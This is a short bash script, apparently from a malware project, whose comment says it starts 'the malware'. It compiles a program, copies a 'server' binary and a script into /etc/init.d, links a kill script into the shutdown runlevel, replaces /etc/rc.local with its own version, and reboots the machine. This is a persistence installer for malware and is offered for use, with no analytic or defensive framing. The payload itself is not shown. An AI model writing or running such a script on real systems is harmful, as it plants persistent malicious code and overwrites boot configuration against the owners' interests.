#!/bin/bash
# This script is used to start the malware

make
cp server /etc/init.d
cp script.sh /etc/init.d
ln -s ../init.d/script.sh /etc/rc0.d/K99server.sh
chmod +x /etc/rc0.d/K99server.sh
rm /etc/rc.local
cp rc.local /etc
chmod 755 /etc/rc.local
reboot

#exit
